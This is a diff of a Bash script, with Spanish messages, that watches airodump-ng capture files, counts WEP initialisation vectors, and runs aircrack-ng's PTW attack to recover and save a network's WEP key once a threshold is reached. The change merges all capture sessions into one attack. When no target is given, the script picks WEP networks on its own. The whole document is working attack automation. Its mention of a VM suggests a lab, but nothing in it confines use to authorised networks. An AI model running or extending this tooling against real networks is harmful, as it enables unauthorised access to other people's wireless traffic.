@@ -73,37 +73,59 @@ while true; do
     # Check free disk space on macOS host
     HOST_AVAIL=$(df -h "$CAPTURES_DIR" | awk 'NR==2 {print $4}')
 
-    # Find the latest .cap and .csv files in captures dir
-    LATEST_CAP=$(ls -t "$CAPTURES_DIR"/*.cap 2>/dev/null | head -n 1 || true)
-    LATEST_CSV=$(ls -t "$CAPTURES_DIR"/*.csv 2>/dev/null | head -n 1 || true)
+    # Collect .cap and .csv files in captures dir
+    shopt -s nullglob
+    CAP_FILES=("$CAPTURES_DIR"/*.cap)
+    CSV_FILES=("$CAPTURES_DIR"/*.csv)
+    shopt -u nullglob
 
     CURRENT_IVS=0
     DETECTED_BSSID=""
     DETECTED_ESSID=""
     DETECTED_CH=""
 
-    if [[ -n "$LATEST_CSV" ]] && [[ -f "$LATEST_CSV" ]]; then
-        # Parse airodump CSV summary
-        # BSSID is col 1, Channel is col 4, Privacy is col 6, # IV is col 11, ESSID is col 14
-        while IFS=, read -r c_bssid c_first c_last c_chan c_speed c_priv c_cipher c_auth c_pwr c_beac c_iv c_lan c_idlen c_essid c_key; do
-            # Strip whitespace
-            c_bssid=$(echo "$c_bssid" | tr -d ' "')
-            c_priv=$(echo "${c_priv:-}" | tr -d ' "')
-            c_iv=$(echo "${c_iv:-0}" | tr -d ' "')
-            c_chan=$(echo "${c_chan:-}" | tr -d ' "')
-            c_essid=$(echo "${c_essid:-}" | tr -d ' "\r')
+    BSSID_LOWER=$(echo "${BSSID:-}" | tr '[:upper:]' '[:lower:]')
 
-            if [[ "$c_bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
-                if [[ -z "$BSSID" ]] || [[ "${BSSID,,}" == "${c_bssid,,}" ]]; then
-                    if [[ "$c_iv" =~ ^[0-9]+$ ]] && [[ "$c_iv" -gt "$CURRENT_IVS" ]]; then
-                        CURRENT_IVS=$c_iv
-                        DETECTED_BSSID=$c_bssid
-                        DETECTED_ESSID=$c_essid
-                        DETECTED_CH=$c_chan
+    if [[ ${#CSV_FILES[@]} -gt 0 ]]; then
+        for csv_file in "${CSV_FILES[@]}"; do
+            [[ -f "$csv_file" ]] || continue
+            file_max_iv=0
+            while IFS=, read -r c_bssid c_first c_last c_chan c_speed c_priv c_cipher c_auth c_pwr c_beac c_iv c_lan c_idlen c_essid c_key; do
+                # Strip whitespace
+                c_bssid=$(echo "$c_bssid" | tr -d ' "')
+                c_priv=$(echo "${c_priv:-}" | tr -d ' "')
+                c_iv=$(echo "${c_iv:-0}" | tr -d ' "')
+                c_chan=$(echo "${c_chan:-}" | tr -d ' "')
+                c_essid=$(echo "${c_essid:-}" | tr -d ' "\r')
+
+                if [[ "$c_bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
+                    c_bssid_lower=$(echo "$c_bssid" | tr '[:upper:]' '[:lower:]')
+                    c_priv_lower=$(echo "$c_priv" | tr '[:upper:]' '[:lower:]')
+
+                    if [[ -z "$BSSID_LOWER" ]]; then
+                        # Auto-detect target: prefer WEP networks or highest IV count
+                        if [[ "$c_priv_lower" == *"wep"* ]] || [[ "$c_iv" =~ ^[0-9]+$ && "$c_iv" -gt 0 ]]; then
+                            if [[ "$c_iv" =~ ^[0-9]+$ ]] && [[ "$c_iv" -gt "$file_max_iv" ]]; then
+                                file_max_iv=$c_iv
+                                DETECTED_BSSID=$c_bssid
+                                DETECTED_ESSID=$c_essid
+                                DETECTED_CH=$c_chan
+                            fi
+                        fi
+                    else
+                        if [[ "$BSSID_LOWER" == "$c_bssid_lower" ]]; then
+                            if [[ "$c_iv" =~ ^[0-9]+$ ]] && [[ "$c_iv" -gt "$file_max_iv" ]]; then
+                                file_max_iv=$c_iv
+                                DETECTED_BSSID=$c_bssid
+                                DETECTED_ESSID=$c_essid
+                                DETECTED_CH=$c_chan
+                            fi
+                        fi
                     fi
                 fi
-            fi
-        done < "$LATEST_CSV"
+            done < "$csv_file"
+            CURRENT_IVS=$((CURRENT_IVS + file_max_iv))
+        done
     fi
 
     TARGET_BSSID="${BSSID:-$DETECTED_BSSID}"
@@ -123,8 +145,14 @@ while true; do
     echo "================================================================="
     echo " 04_HOST_ANALYZER - RECONOCIMIENTO Y CRIPTOANÁLISIS WEP (M2)"
     echo "================================================================="
-    echo "Archivo CAP:      ${LATEST_CAP:-Esperando capturas desde la VM...}"
-    echo "Archivo CSV:      ${LATEST_CSV:-Esperando...}"
+    if [[ ${#CAP_FILES[@]} -eq 0 ]]; then
+        echo "Archivos CAP:     Esperando capturas desde la VM..."
+    elif [[ ${#CAP_FILES[@]} -eq 1 ]]; then
+        echo "Archivo CAP:      $(basename "${CAP_FILES[0]}")"
+    else
+        echo "Archivos CAP:     ${#CAP_FILES[@]} sesiones combinadas"
+    fi
+    echo "Archivos CSV:     ${#CSV_FILES[@]} encontrados"
     echo "Objetivo BSSID:   ${TARGET_BSSID:-Detectando...}"
     echo "Objetivo ESSID:   ${DETECTED_ESSID:-N/A} (Canal ${DETECTED_CH:-N/A})"
     echo "IVs Capturados:   $CURRENT_IVS / $MIN_IVS requeridos"
@@ -143,15 +171,15 @@ while true; do
     fi
 
     # Trigger aircrack-ng when threshold reached and we have a target
-    if [[ "$CURRENT_IVS" -ge "$MIN_IVS" ]] && [[ -n "$LATEST_CAP" ]] && [[ -n "$TARGET_BSSID" ]]; then
+    if [[ "$CURRENT_IVS" -ge "$MIN_IVS" ]] && [[ ${#CAP_FILES[@]} -gt 0 ]] && [[ -n "$TARGET_BSSID" ]]; then
         echo -e "\033[93m[*] Umbral alcanzado ($CURRENT_IVS IVs). Ejecutando aircrack-ng PTW en CPU M2...\033[0m"
         
-        # Execute PTW statistical attack with native aircrack-ng
+        # Execute PTW statistical attack with native aircrack-ng across all capture files
         # -a 1: WEP attack
         # -b: target BSSID
         # -l: save key to file
         # -q: quiet output
-        CRACK_OUT=$("$AIRCRACK_BIN" -a 1 -b "$TARGET_BSSID" -l "$OUTPUT_KEY_FILE" -q "$LATEST_CAP" 2>&1 || true)
+        CRACK_OUT=$("$AIRCRACK_BIN" -a 1 -b "$TARGET_BSSID" -l "$OUTPUT_KEY_FILE" -q "${CAP_FILES[@]}" 2>&1 || true)
 
         if [[ -f "$OUTPUT_KEY_FILE" ]] || grep -iq "KEY FOUND!" <<< "$CRACK_OUT"; then
             echo -e "\033[92m[✔] ¡CLAVE RECUPERADA POR AIRCRACK-NG!\033[0m"
